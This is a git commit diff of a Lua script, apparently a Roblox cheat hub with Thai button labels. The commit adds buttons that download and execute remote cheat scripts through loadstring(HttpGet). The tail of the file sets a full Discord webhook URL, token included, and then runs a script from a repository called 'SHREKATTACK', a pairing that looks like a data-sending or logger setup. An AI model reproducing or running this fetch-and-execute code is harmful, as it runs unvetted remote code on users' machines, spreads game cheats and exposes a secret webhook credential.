b701b8dc8dc33d5b9d4417fad6c2f2916581bafc
DarkBoisHUB <99702280+Bruh123aaa@users.noreply.github.com>
2022-12-09 07:11:54 +0700

    Update Free.lua

--- Free.lua
+++ Free.lua
@@ -7,10 +7,15 @@ local serv = win:Server("สคิปต่างๆ", "")
 local bf = serv:Channel("สคิป บล็อกฟุต")
 local kl = serv:Channel("สคิป คิงพีช")
 local asn = serv:Channel("สคิป อาเซนอล")
+local ffy = serv:Channel("สคิป Funky friday")
 
 bf:Button("Neva hub บล็อกฟุต", function()
 --Blox fruit-Neva-Hub
 loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
+end)
+
+bf:Button("Hoho Hub บล็อกฟุต", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
 end)
 
 kl:Button("One X Hub คิงพีช", function()
@@ -21,5 +26,13 @@ asn:Button("อาเซนอล จำชื่อ Hubไม่ได้555!!"
 --Arsenal
 loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/UltimateCromaSin-Arsenal-Gui/main/AdvanceTechV2.lua"))()
 end)
+
+ffy:Button("Funky friday", function()
+-- Use with Fluxus Android
+-- fluxteam.net
+-- Made by Wally, modded by ShowerHeadFD
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
+end)
+
 _G.webhooksdiscord = "https://discord.com/api/webhooks/1050068639312781395/vU50tq3VQT0sT1VIIDxaECprBaIJqtf5LPh30XeYzm2kbGIPe7DWfpLPvlXco1Ie8jXL"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
